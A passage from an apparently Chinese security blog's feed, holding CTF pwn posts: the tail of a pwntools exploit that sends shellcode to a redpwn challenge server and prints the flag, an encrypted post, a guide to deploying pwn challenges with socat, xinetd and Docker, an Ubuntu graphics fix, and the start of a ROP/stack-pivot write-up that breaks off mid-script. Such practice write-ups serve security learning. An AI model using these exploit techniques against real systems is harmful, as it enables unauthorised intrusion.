ax,[eax+0x69]')</span><br><span class="line">payload += asm('xor al,[eax+0x69]')</span><br><span class="line">payload = payload .ljust(0x4f,'\x40')</span><br><span class="line">payload += asm('or al,[edi+0x71]')</span><br><span class="line">payload += asm('pop esp')</span><br><span class="line">payload += asm('push eax')</span><br><span class="line">payload += asm('pop esi')</span><br><span class="line">payload += asm('pop eax')</span><br><span class="line">payload += asm('push ecx')</span><br><span class="line">payload += asm('pop eax')</span><br><span class="line">payload += asm('inc eax') * 0xa</span><br><span class="line">payload += asm('push ecx')</span><br><span class="line">payload = payload.ljust(0x70,'\x40')</span><br><span class="line">payload += '\x7e\x4D'</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("chall.2019.redpwn.net",4009,0)</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{ok so basically, this is a flag-~-urfnatoufnruiantoeakolfhepicqniuwnfkteoikcoyuqnouqnwfounoakfentou}</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-2.27版本unsorted_bin_libc_leak若干方法</title>
      <link href="/2019/08/13/CTF-Pwn-2.27%E7%89%88%E6%9C%ACunsorted_bin_libc_leak%E8%8B%A5%E5%B9%B2%E6%96%B9%E6%B3%95/"/>
      <url>/2019/08/13/CTF-Pwn-2.27%E7%89%88%E6%9C%ACunsorted_bin_libc_leak%E8%8B%A5%E5%B9%B2%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="a72a31e95bde47da51c5722473b1731f79c4604674bc2c83f8ae6a9e567d4645">ec7d534ddc028faeb0094a679ed37165a983d5139bb58b4a2d1790c783c108816605dba67e820a54b95ed2c63f0f7ed2faf01359047f1e171ff08cef4e9391b23ffa19037d08124d843522cb384fd69ba844e05acc860daa06c4fc9342cfaa09e9b7fa5345155b4a3e49c314f28ea579e8e7707fce7b2bf2a86757bbb38ca579b0a5381bc937ea2d62227c829624fa019b1cc6e8623b8fc7529248cf519f121389ae6e62736ed5ed07736ffa1f715745c4332b76cd7aa30f1c65457f2b9134bf372b07025b23e734d67775ba004df729401528c073c1103df130fb6a4e93672628e742f9e7e598fb515e1e74351e20597c561da59c35964a3385b9a01938a4e8628a59e4115ee44d920538caa5e4279e6683d3d5d4ba019641e083b50b95819481b2afcd53e21245f7ea3c80c5c7d4f7a3f8a8d5c383d7b54540cf4f4863850f012ffd9f1040e678ce148147beb0d5bf4650f95546147fc90aebef0a6b833d6ac41b8f133e6913967a109e28f2c18aa2330a5f8597e45b79e69272e7647adff0901ae8591d869dfdaeccc27ff05d5e5484e48d92564e53bddc07d91752516f2df489ccb0110effc78156c07cd8f22dd0298d871b5ae48d3831d00b3a07517866f9962e0887063b2034c0aff763009214a931ae4c2b0da00e27beb90f8c5234fc2e033cf8de90a0167ebc240f3e5946ecfa1a5b4aeade9184e08ab1f06cab4479a08d11cfc332d026e57a64fe252ef0ada60152684b8e27ea59dd3f4c20a7bef7defc4801cb9bf3f44a1bc0fc3d35a85e735e93ea8a8062c7280f8e5cae9e9f1d8fa0922017bdd62e5c2fdd806902971e04a26d30130102549bb97f17438e8121e290b98b5d2c701f5669bf4dd7dc5fe09c136c70ce8c405c78ed8a9872ba81e4f6c1a344ba353307454f8004be8bcc8fcb84caeddc7f5308c83795c92c8ec1452e4442d19e52942330657f2ba996be08240f3448c3f5c6cad808e2d79d700ef2234b8b3c65be457d64b94552accd04e5cd45283886d8cb31baface2989b198ae2396810b2ab931e9304fd7a4f5c0b467c47117bcb21145790823fc65105502eacc24b0eb6cd0064b55f800074be5f97b1e4f1c260ec21bef540dc84513f90b92e91c0495d7ec99b73507b5262fd85dd7d85eae2c909abbe430f5e6a2209cf77e94d4314a20f40f89091674bc6d284b196ae76bef4de6ae868f410f4af884816d2aee96690298f4aeabdb62b0f41a7a97d92d2d43c29e40c82359407f6c7d55ae461f7fc07ebd449bca418194d28e97c4ac1f6ec8b090eaff9b2e9b170cb2c95fe82b8f576de99804dc7e04a7ce95edb879e79aba02d18d9b24df57618b9c591b513f1cf80ea9c44979c858c209acb25361da873268aed5e058216a72f972f7efdb2cf41698db83372f62fba27fc30100b82728f2aa3c28de9727821781d3b1c268765be361f0541867c8f90d6f52dbfda61acc09cc70f01148e66d849e4f7880cfe6d73350afcfa6656f7c6f88e7c84bcf845c5e570ce9759c8f7ff20735de3f727d1e3602cb524ca8abbcc87e733ac57d856c19a47a81c17616fdb941117ef1a6822b84b48dbc9fcf8b13e23090e17f97a56062e0244b6729839384599ed37864024d6a3550c05ad8797ee9945bb230c1ba9f0df1729b9b41de25f4ba858c659bd053ee899e20ae5fcfc8b38c58cd8b0d5874ed0c5774cf50361660066559a316fde8fbe31e0477b10e41382e7563c962049e5f108f51ece154d45b10475d72146a11efa419ec7321ae1a35183a3ec7f26877367f61e4903c64295332cc48c0926873316d6d0361648d8c2ca0e70c82ef9f8a9528806bdedf3c31187bf308bf78d435f755169fe20b3b1177b144b2ee91d9f910da4b69687b27d1aea4315c2b1b7c51f1c64c860e3b3eb7a27a3f28f8881f23d3bd044c5ef62110a6948ca3021952f9474a7664f78ba90b0883d4700eefb7a8dd1df3d1bf49f084d170edc8f077a885c639e290866c3de9fcba4e7e04094fc12c3e2970eb3261e3e3190288f5e928780f9e6304ef6702d57c1736123c8d9e17954b2b7927757c6e5ccecc22bf241899fd57b6dfa2883ae09a3ad129ff4382b4c12ccfb681441332bf089c11ddc2239789568f977364d6fd7f6176b6c8e2472a72ef8503848eb469db2f5902c9df5da6a0cc55ea22299aad1c8cdd3cfcce883ba3c1ab0d7a5cb9387644ab9d1f9f3d7195da8aba53f06e80a3a243c8f7d0f4ed4d679252f9e0040400d21a9ba70e38e33e92dcd64141c5870317b3f60540de038d595a194fa1402cb67c3e119fc9b6afb8e278f871da89aeb0e2c5394af3225a14de68f8df4e0a046849fc26f331b53af878008917c83e352c8dce1a86b51985181f13adb603f4eff99fbc914d543b353fbe8fefe701f9bb009b6fac0484c3ba514b00eabdd002abce83fb1c3c4872cbd12768f31ac10bb2e4ea32d4721ee7aee76daf7b4f5c4bf4175c68353308860898c5c2b4344b55e9d37a8b6c29731e57ee4fc76663527509c08461225b36f02b01e8fe09756eaa3f76e5080ab9e7d5a94bf54b6bba65d78309eb5d44a182ffd307720520041f9d986b2fefbd5e1618d149b87d775790b6811b946e387a654a422106e1993c483110a401dc8f935ddbdbd7b6decee4882b7abf45dda2f137f344f354e116a0679bece90fa3416f71c53ba6eb618a7b1a4372e7c0d5f499527fa14c46880d520a4e73a736860380e9b536d15e894f169c0b71bd53bac8e7a66cc659a6021392a5fd68be2551d31675a3b4f8b525d4391c3f91e7df99b92133359887521fd47c958fc7c701cb058c2b16638a91c72ac3e314d3e259d2da4bd76a4a994cd66cf53099a1a9fa7f948fa0481d2b3c0225255f2612dc5dfd2bee1f4bf6d28d99c95ce3d8e3fb65d718a9ddfc7f844b3b3f85e4dab11d38e22971e4a28a6eeecb9b81465fc022d00ede5ddc0d14bb79514531b847795553e49cd76a8d20c906581eaf55d05c25bb10f6bc5c817629077470e59a2929df825119a9d89e006c1d125d8a4ecbdad66974a6c3f486f65d7212e1439a6805892d037ade34c8f474edfde3cb9ef600bbde3ab9245143d1a9ebd3db6599eba8ee99f847167973e904fee8aab754c5fdbaed1b9de0ed7f1328791b5efb32f89ab6b63e5b63bce0f4867ae6e22f58cc3015119b61482a1fb7aa8574e7f2c816d02d5339d1a30048a09284d44020617af15300ff2b92fd63edf88ab37ce8a5c49af29b99faf5ce559f7f37a54ddc398ae2bdbdd29be055aa4ae1c154a492a8a79832a49d01bfff623fec87813f7a017748e866c9532dc597abe4d19896128fbba2e9d3894d5ad3045936f56041b1b16d30f7fdecfcaff301e37237855db8ca73a6aa63a63b5de0597391e4e7d0e480b671879f41f2d885f056c3123834101e7df2258a22021965db2f292e18b44733547438599a1681e30fc073d329e1960219cdbbd8156248c92a6fea544bea013db28cc640d7665dd414d842d1b10e14f2e619d9ac953e38f45c11b1955f0c9c505e61e5d03bf3f5e5fa1746fce679b5d91d87bc183d1342040884edcb417d7ae7d05c21a97a54d79abac5f24a3c5a01f7575a4622dffab2858616bbf6e3dc011c690965ee4049d22d9d2561fbfcb5532dfe13aebef33511663bc5e782e132169c8a7b707e5c4d13c6d11d17613afb7ef41cfe21813fce12b68b064146566e8e7cf0e76379f51f008a4d80564e5c960530aad55fa774d0227a5c4742f3c9c4539e78067dc0f70328cc0788a89d216d5a989f48e2b1a6e6a4d87e5a84c54bd84f3bc8bdb09ac6a999db7d6c055ee31b09e386c6277d533eb0535607cf47142b25bd4fb59789b7b85964a55f4e57e9a774e22a70bb893ea3dce3c6715bda162f5459f3299cffce9f358761f132a417de6319da18459e3da2bb7478888926fb8f6b4d90e11d95b2c84613e1817336b7c9f6461378d592bd34b3050653f22f7c1335ffe1370c195ae3f1168260bb7a1cbee020e00b53d484a0e0baece6cfc736fd881c54ed940711a293101ba63c53f81e5999601b7f6d1befab2b3495d177dbd9f6d7b1f230f1fb807757c0459946e1f675fbb6449076f120c51f78a5f5494da65c55daa82c7203d1dbc19bb79c3797712f32db0ce28b132c4c8f619822e2fe4aceb5f0983b4066004626c929676cee9657689dfeee121e381e5fb549c740ab971ab0d29a7650501befb2dfae9339b9087038b7a290012fc96e72cd312f7a4abb815b7d6f4f561dea5cc23b9fae4d44d9c4c700569e8f6bdd7ca20c3a25c31afeef91fa47ba87a06367c2c72d8c845d500b670f0fbaa126aa7708c5419e83149a47d65d03bd87523c42b4d798872c9fec009d1b590ce6db22edf8ba823da32e96bbfe2eeaf4b82db47609c7504ef18f2d5c6154454d5b63570839297c45453b2eff69e421fb7980f4ba9b765e90bb6076bb5db54864e9db2ed029adff2d7e3651bea84ec3650bae23a8bf8b8b474089e43ceaea2485adaedc7030512e3a31edfbee5e304af12af7bf08a47da4d95a0df794ae41ca519caa6123332e203a804a431a2e1c52ac555e5356d7b7307b51f5dfc781f5f8ea11c0ced9cbde94a51bade85f7599e037c1f0a4c769bc14d466624eb9716baa930f9b4293d8d82e2a5cf2ccac2bf5cdb965a9a59ef9943e5da9280416fec55dd30c47f07ba5b30740f7eeeec43c61b8eee903e680ff99d29340539c286a9c94e6f1aeefabb40c2a8d9f478960a25a7a98d1ebe3d3bda61470f575d3f73f24b14596c4d096e43ee88892b3fa67eec758cc2b91c74dd47d4be2638b76570589467961ffdde55c3428df3c1509571d35caa25aa15bd1dfc8091d669f2acbe05018ff7f473f4124016cf309688cb8a4dc9a76839abc0e573e9cefdad7e1d5144179f129d086e5f8927b8606f2da48dc91b98d122b5bf9623974c97bc3895f7da0e2d9fb4e688c5830084dc88d2eabf1baea0cc0a88210951611ca70b7d0573c2073a68320d20d517507a8296241387710a8d037c38d8892e3e90054e1d4036a6d83727a3b0e5e85fd0469bbdb85240ef1fb2ebf87f08464d3e96de673b7eee5e2c80090c6b55d264ff1ddaa0874577092d9528ec28d1e2580f19652967b2c694bc253d9f717361e3595e8ea3b04d24da309e4f33e65158cffcdc1ea0e4690591a351ba2211637e0569e1dc73f9cf1d71d84e1040ec4f644ce0d635b5edbd155c1780ab84d7325a87149221bc69e39ba6ebfbeaa4e7868532f37cefd38e7b6709bb2fcfe47a83a2ea90e858c57bcf5b6ff65d1813bd0c88ba1678110ed960b4f295969c397c413c9098d2e5d873e0f497890001d6bc452c48180b79296f4127e5c0947466a77008fe1103ed92cb55f1d6dfac8d572e9be6c26359beb22c34f556cd75d33de0a06eaa6f0b44a7c720341fa3f19edfb3fad0b66cb96b3c79a6b54335e6c41b903246f23fe5269c7d80b62597679d81a21332103c3755b50b479cb34c238a85c771a34ae08e2d639156597947b6726c4bae079d273c11c3dc2988f6076b5e204b029def66a6ad13da91cafb59d858141cca8c03968a7c0aa9b3f666ff7f38158fe8e5ceeb2d0c366820acfa43a8fae5cba67</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-简单PWN搭建</title>
      <link href="/2019/07/22/Linux-%E7%AE%80%E5%8D%95PWN%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/07/22/Linux-%E7%AE%80%E5%8D%95PWN%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="0x1-简单的Pwn题目搭建（不安全）"><a href="#0x1-简单的Pwn题目搭建（不安全）" class="headerlink" title="0x1 简单的Pwn题目搭建（不安全）"></a>0x1 简单的Pwn题目搭建（不安全）</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:端口,fork exec:文件目录,reuseaddr</span><br></pre></td></tr></tbody></table></figure></div><h2 id="找到Pwn所在的端口"><a href="#找到Pwn所在的端口" class="headerlink" title="找到Pwn所在的端口"></a>找到Pwn所在的端口</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常规</span><br><span class="line">ps aux | less //找到对应的程序的pid</span><br><span class="line">netstat -anop | grep PID</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">一把梭</span><br><span class="line">netstat -pant</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-安全的Pwn题目搭建方法"><a href="#0x2-安全的Pwn题目搭建方法" class="headerlink" title="0x2 安全的Pwn题目搭建方法"></a>0x2 安全的Pwn题目搭建方法</h2><h3 id="https-github-com-giantbranch-pwn-deploy-chroot-下载环境"><a href="#https-github-com-giantbranch-pwn-deploy-chroot-下载环境" class="headerlink" title="https://github.com/giantbranch/pwn_deploy_chroot 下载环境"></a><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a> 下载环境</h3><h3 id="将题目放到bin目录中"><a href="#将题目放到bin目录中" class="headerlink" title="将题目放到bin目录中"></a>将题目放到bin目录中</h3><h3 id="然后在config-py，将REPLACE-BINSH设置为False"><a href="#然后在config-py，将REPLACE-BINSH设置为False" class="headerlink" title="然后在config.py，将REPLACE_BINSH设置为False"></a>然后在config.py，将REPLACE_BINSH设置为False</h3><h3 id="运行一次python-initialize-py"><a href="#运行一次python-initialize-py" class="headerlink" title="运行一次python initialize.py"></a>运行一次python initialize.py</h3><h3 id="然后会出现一个flags-txt（如果想替换flag，就直接修改flag-txt里的flag字符串即可，然后运行一次python-initialize-py）"><a href="#然后会出现一个flags-txt（如果想替换flag，就直接修改flag-txt里的flag字符串即可，然后运行一次python-initialize-py）" class="headerlink" title="然后会出现一个flags.txt（如果想替换flag，就直接修改flag.txt里的flag字符串即可，然后运行一次python initialize.py）"></a>然后会出现一个flags.txt（如果想替换flag，就直接修改flag.txt里的flag字符串即可，然后运行一次python initialize.py）</h3><h3 id="然后运行-docker-compose-up-–build-d"><a href="#然后运行-docker-compose-up-–build-d" class="headerlink" title="然后运行 docker-compose up –build -d"></a>然后运行 docker-compose up –build -d</h3><h3 id="开启题目即可"><a href="#开启题目即可" class="headerlink" title="开启题目即可"></a>开启题目即可</h3><h3 id="注意：若出现libstdc-so-6找不到的情况，说明C-环境没有配好，只需要在已经配好C-环境的同版本ubuntu下找到libstdc-so-6-0-XX（XX为数字）和libgcc-s-so-1放到pwn-deploy-chroot目录下，然后在dockerfile里加入一下代码"><a href="#注意：若出现libstdc-so-6找不到的情况，说明C-环境没有配好，只需要在已经配好C-环境的同版本ubuntu下找到libstdc-so-6-0-XX（XX为数字）和libgcc-s-so-1放到pwn-deploy-chroot目录下，然后在dockerfile里加入一下代码" class="headerlink" title="注意：若出现libstdc++.so.6找不到的情况，说明C++环境没有配好，只需要在已经配好C++环境的同版本ubuntu下找到libstdc++.so.6.0.XX（XX为数字）和libgcc_s.so.1放到pwn_deploy_chroot目录下，然后在dockerfile里加入一下代码"></a>注意：若出现libstdc++.so.6找不到的情况，说明C++环境没有配好，只需要在已经配好C++环境的同版本ubuntu下找到libstdc++.so.6.0.XX（XX为数字）和libgcc_s.so.1放到pwn_deploy_chroot目录下，然后在dockerfile里加入一下代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY ./libstdc++.so.6.0.21 /usr/lib/libstdc++.so.6</span><br><span class="line">COPY ./libgcc_s.so.1 /usr/lib/libgcc_s.so.1</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x3-单独docker靶机搭建"><a href="#0x3-单独docker靶机搭建" class="headerlink" title="0x3 单独docker靶机搭建"></a>0x3 单独docker靶机搭建</h2><h3 id="适用于AWD或者特殊Pwn的搭建"><a href="#适用于AWD或者特殊Pwn的搭建" class="headerlink" title="适用于AWD或者特殊Pwn的搭建"></a>适用于AWD或者特殊Pwn的搭建</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwn_test .</span><br><span class="line">docker run -tid -p 8888:8888 pwn_test</span><br></pre></td></tr></tbody></table></figure></div><h3 id="ctf-xinted"><a href="#ctf-xinted" class="headerlink" title="ctf.xinted"></a>ctf.xinted</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">{</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 8888</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    server_args = --userspec=1000:1000 / timeout 50 ./pwn/pwn</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line"></span><br><span class="line">    # safety options</span><br><span class="line">    per_source  = 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu  = 60 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    rlimit_as     = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line"></span><br><span class="line">    #Instances   = 20 #process limit</span><br><span class="line">    #per_source  = 5 #link ip limit</span><br><span class="line"></span><br><span class="line">    #log warning die</span><br><span class="line">    log_on_success  = PID HOST EXIT DURATION</span><br><span class="line">    log_on_failure  = HOST ATTEMPT </span><br><span class="line">    log_type =FILE /var/log/myservice.log 8388608 15728640</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list</span><br><span class="line">RUN apt-get update && apt-get -y dist-upgrade</span><br><span class="line">RUN apt-get install -y lib32z1 xinetd build-essential</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">COPY ./flag /flag</span><br><span class="line">COPY ./pwn /pwn/pwn</span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line"></span><br><span class="line">RUN chown root:ctf /pwn/pwn && chmod 750 /pwn/pwn</span><br><span class="line"></span><br><span class="line">RUN echo 'ctf - nproc 1500' >>/etc/security/limits.conf</span><br><span class="line"></span><br><span class="line">CMD exec /bin/bash -c "/etc/init.d/xinetd start; trap : TERM INT; sleep infinity & wait"</span><br><span class="line"></span><br><span class="line">EXPOSE 8888</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-low-graphics-解决方案</title>
      <link href="/2019/07/18/Linux-low-graphics-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2019/07/18/Linux-low-graphics-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>虚拟机Ubuntu16.04无法进入图形界面 The system is running in low-graphics mode<br>安装的虚拟机Ubuntu16.04 64位本可以正常使用，在安装了许多软件包（caffe）后不知哪里配置出现问题，出现The system is running in low-graphics mode错误，尝试多种方法，以下方法适用：<br>步骤一：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/X11/xorg.conf.failsafe /etc/X11/xorg.conf</span><br></pre></td></tr></tbody></table></figure></div><p>然后重启虚拟机发现可以进入系统，但是速度很慢，且一卡一顿</p><p>步骤二：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get upgrade //更新源</span><br><span class="line">//更新完毕后 修改xorg.conf</span><br><span class="line">vim /etc/X11/xorg.conf</span><br><span class="line">/*</span><br><span class="line">然后将xorg.conf内的数据清空</span><br><span class="line">*/</span><br></pre></td></tr></tbody></table></figure></div><p>步骤三：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重启虚拟机，发现修复完毕</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 常识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-安恒杯-19年7月赛</title>
      <link href="/2019/07/15/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-19%E5%B9%B47%E6%9C%88%E8%B5%9B/"/>
      <url>/2019/07/15/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-19%E5%B9%B47%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x01-unexploit"><a href="#0x01-unexploit" class="headerlink" title="0x01 unexploit"></a>0x01 <a href="unexploit">unexploit</a></h3><h3 id="发现溢出很少，只能通过ROP，反复跳回read"><a href="#发现溢出很少，只能通过ROP，反复跳回read" class="headerlink" title="发现溢出很少，只能通过ROP，反复跳回read"></a>发现溢出很少，只能通过ROP，反复跳回read</h3><h3 id="read读入的位置由ebp决定，然后不断栈迁移，最后因为程序没有开启nx，所以用shellcode拿到shell"><a href="#read读入的位置由ebp决定，然后不断栈迁移，最后因为程序没有开启nx，所以用shellcode拿到shell" class="headerlink" title="read读入的位置由ebp决定，然后不断栈迁移，最后因为程序没有开启nx，所以用shellcode拿到shell"></a>read读入的位置由ebp决定，然后不断栈迁移，最后因为程序没有开启nx，所以用shellcode拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("unexploit")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def 